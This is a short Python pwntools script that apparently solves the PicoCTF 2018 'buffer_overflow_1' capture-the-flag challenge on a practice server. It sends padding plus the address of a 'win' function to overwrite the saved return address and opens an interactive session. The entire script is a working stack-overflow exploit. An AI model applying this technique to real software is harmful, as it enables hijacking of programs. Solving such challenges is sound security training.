from pwn import *
from LibcSearcher import *

import utils

context.arch = 'i386'
context.log_level = 'debug'

elf = ELF('../PicoCTF_2018_buffer_overflow_1')
target = remote('node4.buuoj.cn', 29824)

get_flag = elf.sym['win']

payload = b'a' * 0x28 + b'a' * 0x4 + p32(get_flag)
target.sendlineafter('string:', payload)
target.interactive()